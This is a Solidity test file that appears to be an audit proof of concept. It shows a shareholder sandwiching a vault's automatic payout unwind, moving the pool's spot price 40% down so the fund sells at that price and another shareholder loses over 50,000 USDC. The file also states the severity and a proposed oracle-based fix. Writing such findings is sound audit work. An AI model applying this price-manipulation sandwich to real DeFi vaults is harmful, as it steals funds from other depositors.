// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {ICoreVault} from "../../../src/interfaces/ICoreVault.sol";
import {IAdapter} from "../../../src/interfaces/IAdapter.sol";
import {MockV4} from "../../mocks/v4/MockV4.sol";
import {AccountingPocFixture} from "./AccountingPocFixture.sol";

/// @notice A Shareholder whose Instant Payout exceeds Free Idle, claiming inside its own swap sandwich.
/// @dev `MockV4.setTick` / `setSwap` stand in for the first leg (the attacker sells WETH into the pool, pushing its
///      price 40 % below the oracle price, and leaves its own just-in-time liquidity at that price as the counterparty
///      of the fund's swap) and the second leg (it takes that liquidity out, now holding the WETH the fund's unwind
///      sold at the bottom, and buys back the rest).
contract UnwindSandwichAttacker {
    function enter(ICoreVault core, IERC20 usdc, uint256 amount) external {
        usdc.approve(address(core), amount);
        core.deposit(amount, 0);
    }

    function claimInsideSandwich(
        ICoreVault core,
        MockV4 pool,
        bytes32 poolId,
        int24 fairTick,
        uint256 fairRate,
        int24 movedTick,
        uint256 movedRate
    ) external returns (ICoreVault.PayoutReceipt memory receipt) {
        pool.setTick(poolId, movedTick);
        pool.setSwap(movedRate, 10_000);
        core.requestPayout(1_000_000_000e6, ICoreVault.PayoutMode.Instant);
        // No hints: the vault sizes the unwind and floors its swap by itself.
        receipt = core.claimPayout("");
        pool.setTick(poolId, fairTick);
        pool.setSwap(fairRate, 10_000);
    }
}

/// @title PoC: the automatic unwind of a payout sells at the pool's spot price, and its 5 % floor is measured against
///        that same spot price, so a claimant who moves the pool makes the fund sell at any price
/// @notice Severity: HIGH (theft from the remaining Shareholders by any holder whose claim needs an unwind).
///
/// Status: the final verification replaced the claimant's hints by a vault-side floor (`SpokeVault._unwindSwap`:
/// `IAdapter.spotQuote` less `MAX_UNWIND_SLIPPAGE_BPS`), and docs/OPEN-QUESTIONS.md (QA3) records that "a spot price
/// can be moved within a block, so the floor bounds execution against the price at the time of the swap, not against
/// an oracle". This proof shows what that leaves open: the fix is insufficient against the actor it was written for.
/// The claimant no longer passes loose minimums; it moves `slot0` instead, and every number the unwind uses
/// (`positionValue`, `spotQuote`, the floor) follows `slot0`.
///
/// Attack sequence (one transaction; the claimant holds shares worth more than Free Idle):
///  1. sell WETH into the fund's hub pool until spot is 40 % below the oracle price (the fund's position is now all
///     WETH, bought from the attacker on the way down);
///  2. `requestPayout(Instant)` + `claimPayout("")`: Idle is short, so `SpokeVault.unwindForPayout` values the
///     position at the moved spot, exits the share it thinks it needs and swaps the WETH it got into USDC in the same
///     pool at the moved price, which passes the floor because the floor is 95 % of that same moved price;
///  3. buy the WETH back, including the fund's WETH sold at 60 cents on the dollar.
///
/// Impact: a 100,000 USDC Instant Payout makes the fund give up about 158,000 USDC of its position (14.5 % of it, at
/// the undisturbed price) for about 105,700 USDC of proceeds. The claimant is paid in full, the sandwich keeps the
/// difference less pool fees, and Alice, the remaining Shareholder, loses more than 50,000 USDC. The loss scales with
/// how far the pool is moved, not with 5 %.
///
/// Fix: bound the unwind (valuation, exit sizing and swap floor) against the oracle price, not the pool's own spot:
/// revert the unwind (the claim then pays what Idle holds, DEC-068) when `slot0` deviates from `IPriceSource` by more
/// than the QA3 bound, and compute the swap minimum from the oracle price.
contract UnwindAtManipulatedSpotPoC is AccountingPocFixture {
    int24 internal constant HALF_WIDTH = 4050;
    /// @dev 1.0001^-5110 = 0.60: the pool's WETH price is pushed 40 % below the oracle price.
    int24 internal constant TICK_MOVED = TICK_FAIR - 5110;

    function setUp() public {
        _deployFund(2000, 25);
    }

    function test_POC_claimantMakesTheFundSellAtTheMovedSpot() public {
        UnwindSandwichAttacker mallory = new UnwindSandwichAttacker();
        _deposit(alice, 1_000_000e6);
        usdc.mint(address(mallory), 100_000e6);
        _refreshPrices();
        mallory.enter(core, usdc, 100_000e6);
        // The Manager puts nearly everything to work: 7,250 USDC of Idle stay.
        bytes32 positionKey = _openHubPosition(1_090_000e6, HALF_WIDTH);
        assertEq(core.freeIdle(), 7250e6, "Free Idle is far below Mallory's share value");

        uint256 aliceFair = _valueOf(alice);
        uint256 fairAssets = core.shareAssets();
        uint128 liquidityBefore = hubV4.positionValue(positionKey).liquidity;
        uint256 positionFair = _positionFairValue(positionKey);

        // WETH -> USDC rates of the pool (USDC base units per WETH base unit, 1e18-scaled) at the fair and moved spot.
        uint160 sqrtMoved = TickMath.getSqrtPriceAtTick(TICK_MOVED);
        uint256 movedRate = Math.mulDiv(Math.mulDiv(sqrtMoved, sqrtMoved, 1 << 96), 1e18, 1 << 96);
        assertApproxEqRel(movedRate, wethPrice1e18 * 60 / 100, 0.01e18, "the moved spot is 60 % of the oracle price");

        uint256 idleBefore = core.idle();
        ICoreVault.PayoutReceipt memory r =
            mallory.claimInsideSandwich(core, v4, hubPoolId, TICK_FAIR, wethPrice1e18, TICK_MOVED, movedRate);

        // Mallory was paid in full; her payout came out of an unwind that ran at the moved price.
        assertGt(r.unwindProceeds, 100_000e6, "the claim unwound more than 100,000 USDC");
        assertGt(r.usdcPaid, 100_000e6, "Mallory received more than she deposited, after every payout fee");
        assertEq(shares.balanceOf(address(mallory)), 0, "full exit");

        // What the fund gave up for those proceeds, at the oracle price, pool back at the fair spot.
        uint128 liquidityAfter = hubV4.positionValue(positionKey).liquidity;
        uint256 fairValueSold = Math.mulDiv(positionFair, liquidityBefore - liquidityAfter, liquidityBefore);
        assertGt(fairValueSold, r.unwindProceeds + 50_000e6, "sold more than 50,000 USDC below its value");
        assertLt(r.unwindProceeds * 100, fairValueSold * 68, "the fund got about two thirds of what it sold");
        assertEq(core.idle(), idleBefore + r.unwindProceeds - r.usdcGross, "only the proceeds reached Idle");

        // Alice bears it: her position lost more than half the size of Mallory's whole payout.
        uint256 aliceLoss = aliceFair - _valueOf(alice);
        assertGt(aliceLoss, 50_000e6, "Alice lost more than 50,000 USDC to a 100,000 USDC payout of another holder");
        assertLt(core.shareAssets() + r.usdcGross + 50_000e6, fairAssets, "Share Assets are short by more than 50,000");

        emit log_named_decimal_uint("unwind proceeds (USDC)", r.unwindProceeds, 6);
        emit log_named_decimal_uint("fair value the fund sold for them (USDC)", fairValueSold, 6);
        emit log_named_decimal_uint("Mallory paid (USDC)", r.usdcPaid, 6);
        emit log_named_decimal_uint("Alice loss (USDC)", aliceLoss, 6);
    }

    /// @dev Principal of the position at the current spot, valued at the oracle price (what Share Assets count).
    function _positionFairValue(bytes32 positionKey) internal view returns (uint256) {
        IAdapter.PositionValue memory v = hubV4.positionValue(positionKey);
        return Math.mulDiv(v.principal0, wethPrice1e18, 1e18) + v.principal1;
    }
}
